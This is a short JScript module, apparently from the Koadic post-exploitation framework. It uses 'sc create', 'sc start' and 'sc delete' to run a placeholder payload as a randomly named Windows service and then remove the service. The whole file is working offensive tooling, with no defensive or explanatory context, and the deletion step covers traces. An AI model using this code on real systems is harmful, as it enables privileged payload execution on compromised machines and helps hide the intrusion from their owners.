try
{
    Koadic.shell.run("sc create #random# binpath= \"~PAYLOAD_DATA~\"", true);
    Koadic.shell.run("sc start #random#", true);
    Koadic.shell.run("sc delete #random#", true);
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
